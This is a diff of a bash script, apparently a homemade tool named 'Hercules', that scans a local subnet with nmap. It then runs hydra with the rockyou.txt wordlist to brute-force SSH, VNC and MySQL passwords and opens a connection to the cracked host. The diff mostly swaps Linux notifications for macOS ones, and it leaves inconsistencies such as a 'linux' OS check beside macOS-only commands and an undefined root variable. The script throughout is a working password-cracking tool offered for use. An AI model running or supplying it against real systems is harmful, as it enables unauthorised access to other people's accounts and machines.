@@ -1,9 +1,10 @@
 #!/bin/bash
+GREEN='\033[0;32m'
 RED='\033[0;31m'
 NC='\033[0m' # No Color
 
 # OS of the computer
-OS="Linux"
+OS="linux"
 
 # For the wget functionality to work
 SITE_URL="https://google.com"
@@ -27,7 +28,7 @@ CURRENT_TIME=$(date +"%I:%M:%S %p")
 # Gets current date in mm/dd/yyyy format
 CURRENT_DATE=$(date +"%m/%d/%Y")
 
-# List of required packages/commands
+# List of required packages/commands (separated by spaces)
 required_packages=("wget" "nmap" "hydra" "ssh" "mysql")
 
 # Function to check if a command exists
@@ -37,19 +38,19 @@ command_exists() {
 
 # Check if root user
 if [[ $EUID -ne 0 ]]; then
-  echo "ERROR: Please run as root."
+  echo -e "${RED}ERROR:${NC} Please run as root."
   exit 1
 fi
 
 # Check for required packages
 for package in "${required_packages[@]}"; do
   if ! command_exists "$package"; then
-    echo -e "ERROR: The required package '$package' is not installed. Please install it and try again."
+    echo -e "ERROR: The required package ${GREEN}'$package'${NC} is not installed. Please install it and try again."
     exit 1
   fi
 done
 
-# When the user enters script --help, it outputs the help message
+# Check if the script is run with --help or -h
 if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     figlet "? HELP ?"
     echo
@@ -58,17 +59,18 @@ if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     echo "It has two programs inside it, one is Hydra and the other is Nmap"
     echo
     echo "+++++++++++++++How to use++++++++++++++++++"
-    echo "To use the program, you have to tell the computer what port you want to scan."
+    echo "To use the program you have to tell the computer what port you want to scan."
     echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
     echo "If there are any ports that are open, it will ask for a username and hostname."
-    echo "When you give the program the username and hostname, it will try to crack the given parameters you gave it."
+    echo "When you give the program the username and hostname, it will try to crack that given parameters you gave it."
     echo
 else
-    if [[ "${OSTYPE}" == *"${OS}"* ]]; then
+    if [[ "$OSTYPE" == "${OS}"* ]]; then
         clear
         if [[ $EUID -ne $root ]]; then
             # Error message if not running as root
-            echo "ERROR: Please run as root."
+            echo "ERROR:root:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
+            echo "TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
             exit
         else
             sudo rm -rf hydra.restore
@@ -80,11 +82,17 @@ else
             # If the user is connected to the internet, it works as normal
             if [[ $? -eq 0 ]]; then
                 echo
-            
             # Else, it notifies them that they are not connected to the internet and tells them to connect
             else
-                # Error message if offline
-                echo "ERROR: You are offline. Please connect to the internet."
+                # Error message if offline notification
+                offlineTitle="Offline"
+                offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
+                osascript -e "display notification \"$offline\" with title \"$offlineTitle\""
+
+                # Offline text in the terminal
+                echo "ERROR:root:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
+                echo "TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
+                exit 1
             fi
 
             # Clear the terminal
@@ -111,36 +119,36 @@ else
 
                     if [[ " ${exit[*]} " == *" $Hydra "* ]]; then
                         echo "Goodbye"
-                        exit 1
+                        exit
                     else
                         $Hydra
-                        exit 1
+                        exit
                     fi
 
                 # If the user asks what the program does, it goes to a function that helps them and explains what the program does
                 elif [[ " ${exit[*]} " == *" $service "* ]]; then
                     echo "Stopping program..."
                     sleep 1
-                    exit 1
+                    exit
                 elif [[ " ${empty[*]} " == *" $service "* ]]; then
                     clear
                     Hercules
 
-                # If the user inputs something that is not a number, it says error
+                # If the user input something that is not a number it says error
                 elif [[ " ${alphabet[*]} " == *" $service "* ]]; then
-                    echo "ERROR please input a number next time"
+                    echo "ERROR: Please input a number next time"
                     sleep 5
                     clear
-                    Hercules                
+                    Hercules
                 else
-                    # Scan a specific port
+                    # Scan specific port
                     sudo nmap -sS 192.168.1.1/24 -p $service --open
                 fi
             }
 
             RunHackingCommand() {
                 # Break in the outputs of my code
-                echo 
+                echo
                 # Services to crack the network
                 echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                 echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
@@ -161,8 +169,21 @@ else
                     else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
+                        # Alerts the user that the computer is trying to connect to the VNC server
+                        title="Connecting to ${user}"
+                        Connecting_To_VNC_SERVER="We are connecting you to ${user}. Please wait..."
+                        osascript -e "display notification \"$Connecting_To_VNC_SERVER\" with title \"$title\""
+
+                        sleep 5
+
+                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
+                        # Notification for the user to see the computer is connected to the VNC server
+                        title="Enter password to ${user}"
+                        Connected_To_VNC_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
+                        osascript -e "display notification \"$Connected_To_VNC_SERVER\" with title \"$title\""
+                        # Put the
                         echo "Loading VNC server..."
-                        xdg-open vnc://$host
+                        open vnc://$host
                         exit
                     fi
                 fi
@@ -182,18 +203,18 @@ else
 
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
-                        # Alerts the user that the computer is trying to connect to the SSH server
+                        # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
-                        Connecting_To_SSH_SERVER="We are connecting you to ${user}, please wait..."
-                        notify-send "$title" "$Connecting_To_SSH_SERVER"
-                        
+                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
+                        osascript -e "display notification \"$Connecting_To_SSH_SERVER\" with title \"$title\""
+
                         sleep 5
 
-                        # It connects to the SSH server and asks for the user to input a password to connect to the SSH server
+                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         title="Enter password to ${user}"
                         Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
-                        notify-send "${title}" "${Connected_To_SSH_SERVER}"
-                        
+                        osascript -e "display notification \"$Connected_To_SSH_SERVER\" with title \"$title\""
+
                         ssh $user@$host
                     fi
                 fi
@@ -218,7 +239,7 @@ else
                     fi
                 fi
             }
-            
+
             Hercules # Calls the Hercules function
 
             RunHackingCommand # Calls the RunHackingCommand function
@@ -232,6 +253,7 @@ else
     else
         clear
         # Warning message for wrong OS
-        echo "WARNING: Wrong OS. Please use the correct OS."
+        echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
     fi
 fi
